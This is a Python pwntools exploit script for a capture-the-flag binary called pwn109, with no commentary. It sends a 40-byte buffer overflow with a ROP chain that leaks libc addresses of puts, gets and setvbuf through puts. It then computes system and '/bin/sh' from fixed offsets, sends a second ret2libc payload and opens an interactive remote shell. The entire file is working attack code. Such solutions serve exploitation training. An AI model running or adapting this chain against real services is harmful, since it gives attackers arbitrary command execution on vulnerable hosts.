from pwn import *
import warnings

warnings.filterwarnings('ignore')

address = '10.10.30.5'
port = 9009

context.log_level = 'critical'
context.binary = binary = ELF('./pwn109.pwn109')
rop = ROP(binary)


overflow = b'A' * 40

ret_addr = p64(rop.find_gadget(['ret'])[0])
pop_rdi_ret_addr = p64(rop.find_gadget(['pop rdi', 'ret'])[0])


main_addr = p64(binary.symbols.main)
puts_plt_addr = p64(binary.plt.puts)


puts_got_addr = p64(binary.got.puts)
gets_got_addr = p64(binary.got.gets)
setvbuf_got_addr = p64(binary.got.setvbuf)


payload1 = overflow
payload1 += pop_rdi_ret_addr
payload1 += puts_got_addr
payload1 += puts_plt_addr
payload1 += pop_rdi_ret_addr
payload1 += gets_got_addr
payload1 += puts_plt_addr
payload1 += pop_rdi_ret_addr
payload1 += setvbuf_got_addr
payload1 += puts_plt_addr
payload1 += main_addr


with remote(address, port) as target:
	target.recvuntil('This time no 🗑️ 🤫 & 🐈🚩.📄 Go ahead 😏')
	target.sendline(payload1)
	target.recvline()

	libc_puts_addr = target.recvline().strip().ljust(8, b'\x00')
	libc_gets_addr = target.recvline().strip().ljust(8, b'\x00')
	libc_setvbuf_addr = target.recvline().strip().ljust(8, b'\x00')

	print(f'LIBC puts Address: {hex(u64(libc_puts_addr))}')
	print(f'LIBC gets Address: {hex(u64(libc_gets_addr))}')
	print(f'LIBC setvbuf Address: {hex(u64(libc_setvbuf_addr))}')

	system_offset = 0x4f550
	bin_sh_offset = 0x1b3e1a
	puts_offset = 0x80aa0

	base_libc_addr = u64(libc_puts_addr) - puts_offset
	system_addr = p64(base_libc_addr + system_offset)
	bin_sh_addr = p64(base_libc_addr + bin_sh_offset)

	payload2 = overflow
	payload2 += ret_addr
	payload2 += pop_rdi_ret_addr
	payload2 += bin_sh_addr
	payload2 += system_addr

	target.recvuntil('This time no 🗑️ 🤫 & 🐈🚩.📄 Go ahead 😏')
	target.sendline(payload2)
	target.interactive()
